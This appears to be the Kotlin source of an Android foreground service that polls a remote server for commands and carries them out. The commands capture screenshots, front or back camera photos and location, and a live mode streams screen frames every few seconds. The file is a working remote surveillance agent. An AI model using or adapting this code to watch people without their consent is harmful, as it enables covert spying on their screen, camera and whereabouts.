package org.hullas.agent

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Intent
import android.content.pm.ServiceInfo
import android.os.Build
import android.os.IBinder
import android.util.Log
import androidx.core.app.NotificationCompat
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch

class HullasService : Service() {
    private val tag = "HullasService"
    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private val serviceLifecycle = ServiceLifecycleOwner()
    private var pollJob: Job? = null
    private var liveJob: Job? = null
    @Volatile private var liveCommandId: String? = null

    override fun onCreate() {
        super.onCreate()
        isRunning = true
        serviceLifecycle.resume()
        AppLifecycle.serviceLifecycle = serviceLifecycle
        startForegroundNotify()
        startPolling()
        Log.i(tag, "Service started")
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int =
        START_STICKY

    override fun onDestroy() {
        isRunning = false
        liveJob?.cancel()
        liveCommandId = null
        pollJob?.cancel()
        scope.cancel()
        AppLifecycle.serviceLifecycle = null
        serviceLifecycle.destroy()
        Log.i(tag, "Service stopped")
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun startForegroundNotify() {
        val channelId = "hullas_monitor"
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val ch = NotificationChannel(
                channelId,
                getString(R.string.notif_title),
                NotificationManager.IMPORTANCE_LOW,
            )
            (getSystemService(NOTIFICATION_SERVICE) as NotificationManager)
                .createNotificationChannel(ch)
        }

        setForegroundMode(screenshot = false)
    }

    private fun startPolling() {
        pollJob?.cancel()
        pollJob = scope.launch {
            val api = ApiClient(this@HullasService)
            val executor = CommandExecutor(this@HullasService)
            var beat = 0
            while (isActive) {
                try {
                    if (beat % 6 == 0) {
                        api.heartbeat()
                        Prefs.setLastHeartbeat(this@HullasService)
                    }
                    beat++
                    if (liveCommandId == null) {
                        val cmd = api.poll()
                        if (cmd != null) {
                            Log.i(tag, "Buyruq: ${cmd.cmd}")
                            handleCommand(api, executor, cmd)
                        }
                    }
                } catch (e: Exception) {
                    Log.e(tag, "Poll xato", e)
                }
                delay(10_000)
            }
        }
    }

    private fun buildNotification(): Notification {
        val channelId = "hullas_monitor"
        val pi = PendingIntent.getActivity(
            this, 0,
            Intent(this, MainActivity::class.java),
            PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT,
        )
        return NotificationCompat.Builder(this, channelId)
            .setContentTitle(getString(R.string.notif_title))
            .setContentText(getString(R.string.notif_text))
            .setSmallIcon(R.drawable.ic_stat)
            .setContentIntent(pi)
            .setOngoing(true)
            .build()
    }

    private fun setForegroundMode(screenshot: Boolean = false, camera: Boolean = false) {
        val notification = buildNotification()
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
                var type = ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
                if (screenshot) {
                    type = type or ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION
                }
                if (camera) {
                    type = type or ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA
                }
                startForeground(NOTIF_ID, notification, type)
            } else {
                startForeground(NOTIF_ID, notification)
            }
        } catch (e: Exception) {
            Log.e(tag, "setForegroundMode", e)
            startForeground(NOTIF_ID, notification)
        }
    }

    private fun needsScreenshot(cmd: String): Boolean =
        cmd == "screenshot" || cmd == "live_start"

    private fun needsCamera(cmd: String): Boolean =
        cmd == "cam_back" || cmd == "cam_front" || cmd == "photo"

    private suspend fun handleCommand(
        api: ApiClient,
        executor: CommandExecutor,
        cmd: Command,
    ) {
        when (cmd.cmd) {
            "live_start" -> {
                startLiveMode(api, cmd)
                return
            }
            "live_stop" -> {
                stopLiveMode(api, cmd)
                return
            }
        }
        val shot = needsScreenshot(cmd.cmd)
        val cam = needsCamera(cmd.cmd)
        if (shot || cam) setForegroundMode(screenshot = shot, camera = cam)
        if (shot) ProjectionHelper.warmUp(this)
        val result = try {
            executor.execute(cmd)
        } finally {
            if (shot || cam) setForegroundMode()
        }
        result.onSuccess { file ->
            if (cmd.cmd == "location") return@onSuccess
            if (file != null) {
                api.sendResult(cmd.id, "done", file = file)
                file.delete()
            } else {
                api.sendResult(cmd.id, "failed", error = "Fayl yaratilmadi")
            }
        }.onFailure { e ->
            when {
                e is LocationException && e.coords != null -> api.sendResult(
                    cmd.id, "done",
                    lat = e.coords.first, lon = e.coords.second,
                )
                e is ScreenshotException -> {
                    api.sendResult(cmd.id, "failed", error = e.message)
                    ProjectionHelper.requestPermission(this)
                }
                else -> api.sendResult(cmd.id, "failed", error = e.message ?: "xato")
            }
        }
    }

    private fun startLiveMode(api: ApiClient, cmd: Command) {
        liveJob?.cancel()
        liveCommandId = cmd.id
        setForegroundMode(screenshot = true)
        ProjectionHelper.warmUp(this)
        Log.i(tag, "Live boshlandi: ${cmd.id}")
        liveJob = scope.launch {
            var frames = 0
            while (isActive && liveCommandId == cmd.id) {
                try {
                    val stopCmd = api.poll()
                    if (stopCmd?.cmd == "live_stop") {
                        Log.i(tag, "Live stop buyrug'i olindi")
                        stopLiveMode(api, stopCmd)
                        return@launch
                    }
                    val file = ProjectionHelper.captureScreenshot(this@HullasService)
                    if (api.sendLiveFrame(cmd.id, file)) {
                        frames++
                    }
                    file.delete()
                } catch (e: ScreenshotException) {
                    Log.e(tag, "Live screenshot", e)
                    api.sendResult(cmd.id, "failed", error = e.message)
                    ProjectionHelper.requestPermission(this@HullasService)
                    liveCommandId = null
                    setForegroundMode(screenshot = false)
                    return@launch
                } catch (e: Exception) {
                    Log.e(tag, "Live loop", e)
                }
                delay(2_500)
            }
            liveCommandId = null
            setForegroundMode(screenshot = false)
            Log.i(tag, "Live tugadi, kadrlar: $frames")
        }
    }

    private fun stopLiveMode(api: ApiClient, cmd: Command) {
        liveJob?.cancel()
        liveJob = null
        liveCommandId = null
        setForegroundMode(screenshot = false)
        api.sendResult(cmd.id, "done")
        Log.i(tag, "Live to'xtatildi")
    }

    companion object {
        const val NOTIF_ID = 100
        @Volatile var isRunning = false

        fun start(ctx: android.content.Context) {
            val i = Intent(ctx, HullasService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                ctx.startForegroundService(i)
            } else {
                ctx.startService(i)
            }
        }
    }
}